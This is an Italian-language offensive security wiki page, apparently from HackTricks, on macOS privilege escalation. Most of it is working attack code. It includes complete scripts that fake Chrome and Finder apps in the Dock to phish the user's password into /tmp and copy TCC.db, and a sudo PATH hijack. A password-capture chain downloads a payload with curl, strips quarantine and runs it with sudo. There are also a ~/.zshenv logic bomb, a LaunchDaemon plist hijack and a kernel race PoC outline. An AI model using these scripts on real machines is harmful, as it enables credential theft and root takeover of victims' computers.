# macOS Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## TCC Privilege Escalation

Se sei qui cercando informazioni sul TCC Privilege Escalation, vai a:


{{#ref}}
macos-security-protections/macos-tcc/
{{#endref}}

## Linux Privesc

Tieni presente che **la maggior parte dei trucchi relativi al privilege escalation che interessano Linux/Unix interesseranno anche le macchine** MacOS. Consulta quindi:


{{#ref}}
../../linux-hardening/linux-basics/linux-privilege-escalation/README.md
{{#endref}}

## Interazione con l'utente

### Sudo Hijacking

Puoi trovare la tecnica originale di [Sudo Hijacking nel post sul Linux Privilege Escalation](../../linux-hardening/linux-basics/linux-privilege-escalation/index.html#sudo-hijacking).

Tuttavia, macOS **mantiene** il **`PATH`** dell'utente quando esegue **`sudo`**. Ciò significa che un altro modo per ottenere questo attacco sarebbe **dirottare altri binary** che la vittima eseguirà comunque quando **esegue sudo:**
```bash
# Let's hijack ls in /opt/homebrew/bin, as this is usually already in the users PATH
cat > /opt/homebrew/bin/ls <<'EOF'
#!/bin/bash
if [ "$(id -u)" -eq 0 ]; then
whoami > /tmp/privesc
fi
/bin/ls "$@"
EOF
chmod +x /opt/homebrew/bin/ls

# victim
sudo ls
```
Nota che un utente che utilizza il terminale molto probabilmente avrà **Homebrew installato**. È quindi possibile effettuare l'hijacking dei binari in **`/opt/homebrew/bin`**.

### Dock Impersonation

Utilizzando un po' di **social engineering**, potresti **impersonare, ad esempio, Google Chrome** all'interno del Dock ed eseguire effettivamente il tuo script:

{{#tabs}}
{{#tab name="Chrome Impersonation"}}
Alcuni suggerimenti:

- Controlla nel Dock se è presente Chrome e, in tal caso, **rimuovi** quella voce e **aggiungi** la voce di Chrome **falsa** nella stessa posizione nell'array del Dock.

<details>
<summary>Script per l'impersonation di Chrome nel Dock</summary>
```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%Chrome%';

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
cat > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
char *cmd = "open /Applications/Google\\\\ Chrome.app & "
"sleep 2; "
"osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
"PASSWORD=$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Enter your password to update Google Chrome:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"Applications:Google Chrome.app:Contents:Resources:app.icns\")' -e 'end tell' -e 'return userPassword'); "
"echo $PASSWORD > /tmp/passwd.txt";
system(cmd);
return 0;
}
EOF

gcc /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c -o /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome
rm -rf /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << 'EOF' > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Google Chrome</string>
<key>CFBundleIdentifier</key>
<string>com.google.Chrome</string>
<key>CFBundleName</key>
<string>Google Chrome</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```
</details>

{{#endtab}}

{{#tab name="Finder Impersonation"}}
Alcuni suggerimenti:

- **Non puoi rimuovere Finder dal Dock**, quindi, se intendi aggiungerlo al Dock, potresti posizionare il Finder fake proprio accanto a quello reale. Per farlo devi **aggiungere la voce del Finder fake all'inizio dell'array del Dock**.
- Un'altra opzione è non inserirlo nel Dock e limitarsi ad aprirlo: "Finder chiede di controllare Finder" non è poi così strano.
- Un'altra opzione per **escalate a root senza chiedere** la password con una finestra orribile consiste nel fare in modo che Finder chieda realmente la password per eseguire un'azione privilegiata:
- Chiedi a Finder di copiare un nuovo file **`sudo`** in **`/etc/pam.d`** (la richiesta della password indicherà che "Finder vuole copiare sudo")
- Chiedi a Finder di copiare un nuovo **Authorization Plugin** (puoi controllare il nome del file, così la richiesta della password indicherà che "Finder vuole copiare Finder.bundle")

<details>
<summary>Finder Dock impersonation script</summary>
```bash
#!/bin/sh

# THIS REQUIRES Finder TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%finder%';

rm -rf /tmp/Finder.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Finder.app/Contents/MacOS
mkdir -p /tmp/Finder.app/Contents/Resources

# Payload to execute
cat > /tmp/Finder.app/Contents/MacOS/Finder.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
char *cmd = "open /System/Library/CoreServices/Finder.app & "
"sleep 2; "
"osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
"PASSWORD=$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Finder needs to update some components. Enter your password:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"System:Library:CoreServices:Finder.app:Contents:Resources:Finder.icns\")' -e 'end tell' -e 'return userPassword'); "
"echo $PASSWORD > /tmp/passwd.txt";
system(cmd);
return 0;
}
EOF

gcc /tmp/Finder.app/Contents/MacOS/Finder.c -o /tmp/Finder.app/Contents/MacOS/Finder
rm -rf /tmp/Finder.app/Contents/MacOS/Finder.c

chmod +x /tmp/Finder.app/Contents/MacOS/Finder

# Info.plist
cat << 'EOF' > /tmp/Finder.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Finder</string>
<key>CFBundleIdentifier</key>
<string>com.apple.finder</string>
<key>CFBundleName</key>
<string>Finder</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Finder
cp /System/Library/CoreServices/Finder.app/Contents/Resources/Finder.icns /tmp/Finder.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Finder.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```
</details>

{{#endtab}}
{{#endtabs}}

### Phishing del prompt della password + riutilizzo di sudo

Il malware spesso abusa dell'interazione dell'utente per **catturare una password in grado di usare sudo** e riutilizzarla programmaticamente. Un flusso comune:

1. Identificare l'utente connesso con `whoami`.
2. **Ripetere i prompt della password** finché `dscl . -authonly "$user" "$pw"` non restituisce un esito positivo.
3. Memorizzare la credenziale (ad esempio, `/tmp/.pass`) e utilizzare `sudo -S` per eseguire azioni privilegiate (password tramite stdin).

Catena minima di esempio:
```bash
user=$(whoami)
while true; do
read -s -p "Password: " pw; echo
dscl . -authonly "$user" "$pw" && break
done
printf '%s\n' "$pw" > /tmp/.pass
curl -o /tmp/update https://example.com/update
printf '%s\n' "$pw" | sudo -S xattr -c /tmp/update && chmod +x /tmp/update && /tmp/update
```
La password sottratta può quindi essere riutilizzata per **cancellare la quarantena di Gatekeeper con `xattr -c`**, copiare LaunchDaemons o altri file privilegiati ed eseguire ulteriori fasi in modo non interattivo.

## Vettori specifici delle versioni più recenti di macOS (2023–2025)

### `AuthorizationExecuteWithPrivileges` deprecato ancora utilizzabile

`AuthorizationExecuteWithPrivileges` è stato deprecato nella versione 10.7, ma **funziona ancora su Sonoma/Sequoia**. Molti updater commerciali invocano `/usr/libexec/security_authtrampoline` con un percorso non attendibile. Se il binary di destinazione è scrivibile dall'utente, puoi inserire un trojan e sfruttare il prompt legittimo:
```bash
# find vulnerable helper calls
log stream --info --predicate 'eventMessage CONTAINS "security_authtrampoline"'

# replace expected helper
cp /tmp/payload /Users/me/Library/Application\ Support/Target/helper
chmod +x /Users/me/Library/Application\ Support/Target/helper
# when the app updates, the root prompt spawns your payload
```
Combina con i **trucchi di masquerading sopra** per presentare una finestra di dialogo della password credibile.


### Privileged helper / XPC triage

Molti privesc moderni di terze parti su macOS seguono lo stesso pattern: un **LaunchDaemon root** espone un **servizio Mach/XPC** da **`/Library/PrivilegedHelperTools`**, quindi l'helper non valida il client, lo valida **troppo tardi** (PID race) oppure espone un **metodo root** che utilizza un **percorso/script controllato dall'utente**. Questa è la classe di bug alla base di molte vulnerabilità recenti negli helper dei client VPN, dei game launcher e degli updater.

Checklist rapida di triage:
```bash
ls -l /Library/PrivilegedHelperTools /Library/LaunchDaemons
plutil -p /Library/LaunchDaemons/*.plist 2>/dev/null | rg 'MachServices|Program|ProgramArguments|Label'
for f in /Library/PrivilegedHelperTools/*; do
echo "== $f =="
codesign -dvv --entitlements :- "$f" 2>&1 | rg 'identifier|TeamIdentifier|com.apple'
strings "$f" | rg 'NSXPC|xpc_connection|AuthorizationCopyRights|authTrampoline|/Applications/.+\.sh'
done
```
Presta particolare attenzione agli helper che:

- continuano ad accettare richieste **dopo la disinstallazione** perché il job è rimasto caricato in `launchd`
- eseguono script o leggono la configurazione da **`/Applications/...`** o da altri percorsi scrivibili da utenti non-root
- si basano sulla validazione dei peer tramite **PID** o **solo bundle-id**, che potrebbe essere soggetta a race condition

Per maggiori dettagli sui bug di autorizzazione degli helper, consulta [questa pagina](macos-proces-abuse/macos-ipc-inter-process-communication/macos-xpc/macos-xpc-authorization.md).

### Ereditarietà dell'ambiente degli script di PackageKit (CVE-2024-27822)

Prima che Apple risolvesse il problema in **Sonoma 14.5**, **Ventura 13.6.7** e **Monterey 12.7.5**, le installazioni avviate dall'utente tramite **`Installer.app`** / **`PackageKit.framework`** potevano eseguire gli **script PKG come root all'interno dell'ambiente dell'utente corrente**. Ciò significa che un package che utilizzava **`#!/bin/zsh`** avrebbe caricato **`~/.zshenv`** dell'attaccante ed eseguito il relativo contenuto come **root** quando la vittima installava il package.

Questo è particolarmente interessante come **logic bomb**: è sufficiente ottenere un foothold nell'account dell'utente e disporre di un file di avvio della shell scrivibile, quindi attendere che l'utente esegua qualsiasi installer vulnerabile basato su **zsh**. In genere ciò non si applica alle distribuzioni **MDM/Munki**, perché vengono eseguite all'interno dell'ambiente dell'utente root.
```bash
# inspect a vendor pkg for shell-based install scripts
pkgutil --expand-full Target.pkg /tmp/target-pkg
find /tmp/target-pkg -type f \( -name preinstall -o -name postinstall \) -exec head -n1 {} \;
rg -n '^#!/bin/(zsh|bash)' /tmp/target-pkg

# logic bomb example for vulnerable zsh-based installers
echo 'id > /tmp/pkg-root' >> ~/.zshenv
```
Se vuoi approfondire gli abusi specifici degli installer, consulta anche [questa pagina](macos-files-folders-and-binaries/macos-installers-abuse.md).

### LaunchDaemon plist hijack (CVE-2025-24085 pattern)

Se un plist di LaunchDaemon o il suo target `ProgramArguments` è **scrivibile dall'utente**, puoi escalare sostituendolo e forzando il ricaricamento da parte di launchd:
```bash
sudo launchctl bootout system /Library/LaunchDaemons/com.apple.securemonitor.plist
cp /tmp/root.sh /Library/PrivilegedHelperTools/securemonitor
chmod 755 /Library/PrivilegedHelperTools/securemonitor
cat > /Library/LaunchDaemons/com.apple.securemonitor.plist <<'PLIST'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0"><dict>
<key>Label</key><string>com.apple.securemonitor</string>
<key>ProgramArguments</key>
<array><string>/Library/PrivilegedHelperTools/securemonitor</string></array>
<key>RunAtLoad</key><true/>
</dict></plist>
PLIST
sudo launchctl bootstrap system /Library/LaunchDaemons/com.apple.securemonitor.plist
```
Questo rispecchia il pattern di exploit pubblicato per **CVE-2025-24085**, in cui un plist scrivibile veniva sfruttato per eseguire codice dell'attaccante come root.

### Race sulle credenziali SMR di XNU (CVE-2025-24118)

Una **race in `kauth_cred_proc_update`** consente a un attaccante locale di corrompere il puntatore alle credenziali in sola lettura (`proc_ro.p_ucred`) eseguendo in race loop di `setgid()`/`getgid()` tra i thread, finché non si verifica una `memcpy` parzialmente eseguita. Una corruzione riuscita fornisce **uid 0** e accesso alla memoria del kernel. Struttura minima del PoC:
```c
// thread A
while (1) setgid(rand());
// thread B
while (1) getgid();
```
Abbinalo a un heap grooming per posizionare dati controllati nel punto in cui il puntatore viene riletto. Nelle build vulnerabili, questo consente una **local kernel privesc** affidabile senza richiedere bypass di SIP.

### Bypass di SIP tramite Migration Assistant ("Migraine", CVE-2023-32369)

Se disponi già di root, SIP continua a bloccare le scritture nelle posizioni di sistema. Il bug **Migraine** sfrutta l'entitlement di Migration Assistant `com.apple.rootless.install.heritable` per generare un processo figlio che eredita il bypass di SIP e sovrascrive percorsi protetti, ad esempio `/System/Library/LaunchDaemons`. La catena è la seguente:

1. Ottenere root su un sistema attivo.
2. Attivare `systemmigrationd` con uno state appositamente creato per eseguire un binary controllato dall'attaccante.
3. Usare l'entitlement ereditato per modificare file protetti da SIP, mantenendo la persistenza anche dopo il reboot.

### NSPredicate/XPC expression smuggling (classe di bug CVE-2023-23530/23531)

Diversi demoni Apple accettano oggetti **NSPredicate** tramite XPC e validano solo il campo `expressionType`, controllabile dall'attaccante. Creando un predicate che valuta selector arbitrari, è possibile ottenere **code execution in root/system XPC services** come `coreduetd` e `contextstored`. Se combinato con un iniziale sandbox escape dell'applicazione, ciò consente una **privilege escalation senza prompt dell'utente**. Cerca endpoint XPC che deserializzano predicate e non dispongono di un visitor robusto.

## TCC - Root Privilege Escalation

### CVE-2020-9771 - mount_apfs TCC bypass e privilege escalation

**Qualsiasi utente** (anche non privilegiato) può creare e montare uno snapshot di Time Machine con `-o noowners` e **accedere a TUTTI i file** di quello snapshot, bypassando i controlli di ownership sul volume attivo. L'unico privilegio necessario è che l'applicazione utilizzata, come `Terminal`, disponga di **Full Disk Access** (`kTCCServiceSystemPolicyAllfiles`).

I comandi e la spiegazione completa sono disponibili nella pagina sui TCC bypass:

{{#ref}}
macos-security-protections/macos-tcc/macos-tcc-bypasses/README.md
{{#endref}}

## Informazioni sensibili

Questo può essere utile per effettuare una privilege escalation:


{{#ref}}
macos-files-folders-and-binaries/macos-sensitive-locations.md
{{#endref}}

## Riferimenti

- [Microsoft "Migraine" SIP bypass (CVE-2023-32369)](https://www.microsoft.com/en-us/security/blog/2023/05/30/new-macos-vulnerability-migraine-could-bypass-system-integrity-protection/)
- [CVE-2025-24118 SMR credential race write-up & PoC](https://github.com/jprx/CVE-2025-24118)
- [CVE-2024-27822: macOS PackageKit Privilege Escalation](https://khronokernel.com/macos/2024/06/03/CVE-2024-27822.html)
- [CVE-2024-30165: AWS Client VPN for macOS Local Privilege Escalation](https://blog.emkay64.com/macos/CVE-2024-30165-finding-and-exploiting-aws-client-vpn-on-macos-for-local-privilege-escalation/)

{{#include ../../banners/hacktricks-training.md}}
